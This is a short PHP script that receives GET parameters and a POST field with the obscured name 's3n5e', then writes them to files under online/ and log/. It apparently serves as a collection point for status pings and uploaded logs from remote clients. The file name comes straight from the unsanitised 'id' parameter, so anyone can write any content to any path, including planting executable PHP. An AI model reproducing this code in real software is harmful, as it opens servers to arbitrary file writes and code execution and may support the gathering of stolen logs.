<?php
echo (":) <3");
#Mkdir('online');
#Mkdir('log');
echo '<meta http-equiv="Content-Type"content="text/html;charset=UTF-8">';

$id = isset($_GET['id']) ? $_GET['id'] : 0;
$mod = isset($_GET['mod']) ? $_GET['mod'] : 0;
$online = isset($_GET['online']) ? $_GET['online'] : 0;
$log = isset($_POST['s3n5e']) ? $_POST['s3n5e'] : 0;

if ($mod == "1"){
	$online1 = fopen("online/".$id, "w");
	fwrite($online1, $online);
}

if ($mod == "2"){
	$log1 = fopen("log/".$id, "w");
	fwrite($log1, $log);
}

?>